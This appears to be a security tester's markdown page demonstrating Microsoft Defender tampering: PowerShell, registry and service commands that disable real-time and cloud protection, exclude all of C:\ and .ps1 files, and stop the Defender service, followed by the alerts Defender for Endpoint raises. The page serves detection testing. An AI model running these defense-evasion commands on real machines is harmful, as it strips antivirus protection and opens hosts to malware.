# AV Tampering 
Microsoft Defender for Endpoint does provide AV tampering protection called **Tamper Protection**, preventing attackers from modifying values and disabling detection engines during defense evasion attempts. 
On this page, I would like to showcase some test methods and demonstrate the detection/alerts capabilities of Microsoft Defender for Endpoint.

## TEST insights
PowerShell, Defender Cmdlet 
```powershell
# Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true
# Disable cloud-delivered protection
Set-MpPreference -MAPSReporting 0
# Modify exclusions - Extensions & Paths 
Set-MpPreference -ExclusionExtension "ps1" -ExclusionPath "C:\"
```

PowerShell, Create new registry values
```powershell
# Disable real-time protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name DisableRealtimeMonitoring -Value 1 -PropertyType DWord -Force
# Disable cloud-delivered protection
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" -Name SpynetReporting -Value 0 -PropertyType DWord -Force
# Modify exclusions - Extensions & Paths 
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" -Name "ps1" -Value 0 -PropertyType String -Force
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" -Name "C:\" -Value 0 -PropertyType String -Force
```
> [!Important]
> If the specified path doesn't exist, PowerShell returns an error. So, please ensure that the path exists. If it doesn't exist, you can create it.
> e.g. if Exclusions/Extensions path doesn't exist
> ```powershell
> New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions" -Name 'Extensions' -Force -ErrorAction 0
> ```

PowerShell, Stop Defender Service & Process
```powershell
Stop-Service -Name "WinDefend"
Stop-Process -Name "MsMpEng"
```

Windows commands, Create new registry values
```cmd
rem Disable real-time protection
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f
rem Disable cloud-delivered protection
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d 0 /f
rem Modify exclusions - Extensions & Paths 
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Extensions" /v "ps1" /t REG_SZ /d 0 /f
reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /v "C:\" /t REG_DWORD /d 0 /reg:64
```

Windows commands, Stop Defender Service, Network Service 
```cmd
sc stop WinDefend
net stop WinDefend
```

## Alerts & Detections

- [x] Suspicious Microsoft Defender Antivirus exclusion
- [x] Attempt to turn off Microsoft Defender Antivirus protection
- [x] An active 'MpTamperSrvDisableAV' malware was prevented from executing via AMSI
- [x] An active 'MpTamperSrvDisableAV' malware in a command line was prevented from executing
- [x] Microsoft Defender Antivirus protection turned off

If Tamper Protection enabled...
- [x] Microsoft Defender Antivirus tampering

## Reference
- [Current limits of Defender AV Tamper Protection](https://cloudbrothers.info/current-limits-defender-av-tamper-protection/)
- [Make sure Tamper Protection is turned on](https://techcommunity.microsoft.com/t5/microsoft-defender-for-endpoint/make-sure-tamper-protection-is-turned-on/ba-p/2695568)
- [When coin miners evolve, Part 1: Exposing LemonDuck and LemonCat, modern mining malware infrastructure](https://www.microsoft.com/en-us/security/blog/2021/07/22/when-coin-miners-evolve-part-1-exposing-lemonduck-and-lemoncat-modern-mining-malware-infrastructure/)
- [When coin miners evolve, Part 2: Hunting down LemonDuck and LemonCat attacks](https://www.microsoft.com/en-us/security/blog/2021/07/29/when-coin-miners-evolve-part-2-hunting-down-lemonduck-and-lemoncat-attacks/)


#### Disclaimer
The views and opinions expressed herein are those of the author and do not necessarily reflect the views of company.